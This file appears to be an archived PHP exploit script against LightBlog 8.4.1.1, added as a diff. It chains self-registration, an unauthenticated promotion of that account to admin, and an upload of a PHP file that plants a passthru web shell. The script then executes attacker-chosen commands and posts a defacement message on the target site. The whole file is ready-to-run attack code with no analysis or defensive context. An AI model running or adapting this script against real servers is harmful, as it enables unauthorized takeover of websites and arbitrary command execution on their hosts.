@@ -1,0 +1,215 @@
+#!/usr/bin/php -q -d short_open_tag=on
+<?
+echo "
+LightBlog 8.4.1.1 Remote Code Execution Exploit
+by BlackHawk <hawkgotyou@gmail.com> <http://itablackhawk.altervista.org>
+Thanks to rgod for the php code and Marty for the Love
+
+";
+if ($argc<3) {
+echo "Usage: php ".$argv[0]." Host Path 
+Host:          target server (ip/hostname)
+Path:          path of lightblog
+
+Example:
+php ".$argv[0]." localhost /lightblog/ dir";
+
+die;
+}
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+function sendpacketii($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+        $c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+        }
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+}
+
+$host=$argv[1];
+$path=$argv[2];
+$cmd="";
+for ($i=3; $i<=$argc-1; $i++){
+$cmd.=" ".$argv[$i];
+}
+$cmd=urlencode($cmd);
+
+
+$port=80;
+$proxy="";
+
+if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+echo "Step 0 - If Shell already exists, run it..\r\n";
+$packet ="GET ".$p."images/piggy_marty.php?cmd=$cmd HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+if (strstr($html,"666999"))
+{
+  echo "Exploit succeeded...\r\n";
+  $temp=explode("666999",$html);
+  die("\r\n".$temp[1]."\r\n");
+}
+
+echo 'Step 1 - Creating New User (Name: Piggy_Marty Pwd: DAFORNO_IMPERAT)..';
+//Retrieving the "confirmation" code
+$packet ="GET ".$p."register.php HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+
+preg_match('#<b>([a-zA-Z0-9]+?)</b><input name="rand" type="hidden" value="([a-zA-Z0-9]+?)" />#is', $html, $fuori);
+
+$conf_code = $fuori[1];
+$rand_code = $fuori[2];
+
+//Doing the registration
+$data="rand=$rand_code&val=$conf_code&username_post=Piggy_Marty&pwd1_post=DAFORNO_IMPERAT&pwd2_post=DAFORNO_IMPERAT&name_post=Piggy_Marty&email_post=hawkgotyou@gmail.com";
+$packet="POST ".$p."register.php HTTP/1.0\r\n";
+$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, * /*\r\n";
+$packet.="Accept-Language: it\r\n";
+$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
+$packet.="Accept-Encoding: gzip, deflate\r\n";
+$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
+$packet.="Host: localhost\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Connection: Close\r\n";
+$packet.="Cache-Control: no-cache\r\n\r\n";
+$packet.=$data;
+sendpacketii($packet);
+sleep(1);
+
+echo 'Step 2 - Promoting Piggy_Marty to admin level..';
+$data="type_post=admin&username_post=Piggy_Marty";
+$packet="POST ".$p."cp_memberedit.php HTTP/1.0\r\n";
+$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, * /*\r\n";
+$packet.="Accept-Language: it\r\n";
+$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
+$packet.="Accept-Encoding: gzip, deflate\r\n";
+$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
+$packet.="Host: localhost\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Connection: Close\r\n";
+$packet.="Cache-Control: no-cache\r\n\r\n";
+$packet.=$data;
+sendpacketii($packet);
+sleep(1);
+
+echo 'Step 3 - Uploading Shell Creator..';
+$data="-----------------------------7d529a1d23092a\r\n";
+$data.="Content-Disposition: form-data; name=\"image\"; filename=\"piggy_marty_creator.php\"\r\n";
+$data.="Content-Type:\r\n\r\n";
+$data.="<?php
+\$fp=fopen('piggy_marty.php','w');
+fputs(\$fp,'<?php error_reporting(0);
+set_time_limit(0);
+if (get_magic_quotes_gpc()) {
+\$_GET[cmd]=stripslashes(\$_GET[cmd]);
+}
+echo 666999;
+passthru(\$_GET[cmd]);
+echo 666999;
+?>');
+fclose(\$fp);
+chmod('piggy_marty.php',777);
+?>\r\n";
+$data.='-----------------------------7d529a1d23092a
+Content-Disposition: form-data; name="title"
+
+Not so good if you see this..
+-----------------------------7d529a1d23092a
+Content-Disposition: form-data; name="post"
+
+An Exploit has attacked your site.. contact hawkgotyou@gmail.com for more details
+-----------------------------7d529a1d23092a--
+';
+$packet="POST ".$p."main.php HTTP/1.0\r\n";
+$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, * /*\r\n";
+$packet.="Referer: http://".$host.$path."/\r\n";
+$packet.="Cookie: Lightblog_username=Piggy_Marty&Lightblog_password=DAFORNO_IMPERAT\r\n";
+$packet.="Accept-Language: it\r\n";
+$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d529a1d23092a\r\n";
+$packet.="Accept-Encoding: gzip, deflate\r\n";
+$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Connection: Close\r\n";
+$packet.="Cache-Control: no-cache\r\n\r\n";
+$packet.=$data;
+sendpacketii($packet);
+sleep(1);
+
+echo 'Step 4 - Executing Creator..';
+$packet ="GET ".$p."images/piggy_marty_creator.php HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+sleep(1);
+
+echo "Step 5 - Execute Commands..\r\n";
+$packet ="GET ".$p."images/piggy_marty.php?cmd=$cmd HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+if (strstr($html,"666999"))
+{
+  echo "Exploit succeeded...\r\n";
+  $temp=explode("666999",$html);
+  die("\r\n".$temp[1]."\r\n");
+}
+
+# Coded With BH Fast Generator v0.1
+?>
+
+# milw0rm.com [2007-10-09]
